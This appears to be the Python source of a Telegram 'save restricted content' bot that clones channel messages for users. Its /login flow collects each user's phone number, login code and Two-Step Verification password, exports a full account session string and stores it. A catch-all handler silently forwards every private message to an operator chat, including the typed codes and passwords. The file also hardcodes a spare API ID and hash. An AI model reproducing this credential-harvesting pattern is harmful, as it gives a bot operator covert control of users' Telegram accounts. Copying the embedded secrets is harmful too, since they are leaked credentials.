#Github.com/Vasusen-code

import os, asyncio
from .. import bot, ACCESS, API_ID, API_HASH

from telethon import events, Button
# from decouple import config
from pyrogram import Client
from pyrogram.errors import SessionPasswordNeeded, FloodWait, PhoneCodeInvalid, PhoneCodeExpired 

from main.plugins.helpers import login, logout, force_sub

ht = """Help:

**FOR PUBLIC CHANNEL:**
- Send me direct link of message. 

**FOR PRIVATE CHANNEL:**
- Login 
- Then send Link of message of any channel you've joined.

#FAQ 

- If bot says “Have you joined the channel?” Then just login again in bot and try.

- If bot says “Please don't spam links, wait until ongoing process is done.” then send /free command in bot and try after 10 minutes. 

- if bot says “Login credentials not found” the just login again

- If bot shows error containing “AUTH_KEY_DUPLICATED” in it then login again.

- if you batch is stuck then use /cancel 

#Note : Don't use the /free command unnecessarily.
"""

otp_text = """An OTP has been sent to your number. 

Please send the OTP with space, example: `1 2 3 4 5`."""

APIID = [API_ID, 29841594]
APIHASH = [API_HASH, "1674d13f3308faa1479b445cdbaaad2b"]

@bot.on(events.NewMessage(incoming=True,func=lambda e: e.is_private))
async def access(event):
    await event.forward_to(ACCESS)

@bot.on(events.NewMessage(incoming=True, pattern="/start"))
async def start(event):
    await event.reply("Send me **link** of any **public** channel message to clone it here 🔗, For **private** channel message, First **/login** then send any **message link** from your chat ✅.\n\n**SUPPORT:** @TeamDrone\n**DEV:** @MaheshChauhan") 

@bot.on(events.NewMessage(incoming=True, pattern="/login"))
async def linc(event):
    process = 0
    Drone = event.client
    number = 0
    otp = 0
    session = ""
    passcode = ""
    ai = ''
    ah = ''
    if not process < 10:
        return await event.reply("Too many logins, try again in some mins.")
    async with Drone.conversation(event.chat_id, exclusive=False) as conv: 
        try:
            xx = await conv.send_message("Send me your contact number with country code(eg +1 or +91) to login.")
            contact = await conv.get_response()
            print(contact.text) 
            number = ' '.join(str(contact.text))
        except Exception as e: 
            print(e)
            return await xx.edit("An error occured while waiting for the response.")
        client = Client("my_account", api_id=APIID[0], api_hash=APIHASH[0], in_memory=True)
        ai = APIID[0]
        ah = APIHASH[0]
        try:
            await client.connect()
        except ConnectionError:
            await client.disconnect()
            await client.connect()
        code_alert = await conv.send_message("Sending code...")
        try:
            code = await client.send_code(number)
            await asyncio.sleep(1)
        except FloodWait as e:
            await client.disconnect()
            client = Client("my_account", api_id=APIID[-1], api_hash=APIHASH[-1])
            ai = APIID[-1]
            ah = APIHASH[-1]
            try:
                await client.connect()
            except ConnectionError:
                await client.disconnect()
                await client.connect()
            try:
                code = await client.send_code(number)
                await asyncio.sleep(1)
            except FloodWait:
                await conv.send_message(f"Can't send code, you have Floodwait of {e.x} Seconds.")
                return
        except Exception as e:
            print(e)
            await conv.send_message(f"**Error**: {str(e)}")
            return
        try:
            await code_alert.delete()
            ask_code = await conv.send_message(otp_text)  
            otp_ = await conv.get_response()
            otp = otp_.text
        except Exception as e: 
            print(e)
            return await ask_code.edit("An error occured while waiting for the response.")
        try:
            await client.sign_in(number, code.phone_code_hash, phone_code=' '.join(str(otp)))
        except PhoneCodeInvalid:
            await conv.send_message("Invalid Code, try again.")
            return
        except PhoneCodeExpired:
            await conv.send_message("Code has expired, try again.")
            return
        except SessionPasswordNeeded:
            try:
                xz = await conv.send_message("Send your Two-Step Verification password.") 
                z = await conv.get_response()
                passcode = z.text
            except Exception as e: 
                print(e)
                return await xz.edit("An error occured while waiting for the response.")
            try:
                await client.check_password(passcode)
            except Exception as e:
                await conv.send_message(f"**ERROR:** {str(e)}")
                return
        except Exception as e:
            await conv.send_message(f"**ERROR:** {str(e)}")
            return
        try:
            session = await client.export_session_string()
        except Exception as e:
            await conv.send_message(f"**ERROR:** {str(e)}")
            return
        await login(event.sender_id, ai, ah, session) 
        await Drone.send_message(event.chat_id, "✅ Login credentials saved.\n\n⚠️ click on 'yes its me' when telegram asks if is it you who logged in.")
        await client.disconnect()
        process += 1
        await asyncio.sleep(60)
        process -= 1
        
@bot.on(events.NewMessage(incoming=True, pattern="/logout"))
async def louc(event):
    edit = await event.reply("Trying to logout.")
    await logout(event.sender_id)
    await edit.edit('✅ successfully Logged out.')

@bot.on(events.NewMessage(incoming=True, pattern="/help"))
async def helpc(event):
    await event.reply(ht)

@bot.on(events.NewMessage(incoming=True, pattern="/setthumb"))
async def helpc(event):
    Drone = event.client                    
    async with Drone.conversation(event.chat_id, exclusive=False) as conv: 
        xx = await conv.send_message("Send me any image for thumbnail.")
        x = await conv.get_response()
        if not x.media:
            xx.edit("No media found.")
        mime = x.file.mime_type
        if not 'png' in mime:
            if not 'jpg' in mime:
                if not 'jpeg' in mime:
                    return await xx.edit("No image found.")
        await xx.delete()
        t = await event.client.send_message(event.chat_id, 'Trying.')
        path = await event.client.download_media(x.media)
        if os.path.exists(f'{event.sender_id}.jpg'):
            os.remove(f'{event.sender_id}.jpg')
        os.rename(path, f'./{event.sender_id}.jpg')
        await t.edit("✅ Temporary thumbnail saved!")

@bot.on(events.NewMessage(incoming=True, pattern="/remthumb"))
async def remt(event):  
    Drone = event.client            
    edit = await event.reply('Trying.')
    try:
        os.remove(f'{event.sender_id}.jpg')
        await edit.edit('✅ Removed!')
    except Exception:
        await edit.edit("No thumbnail saved.")    
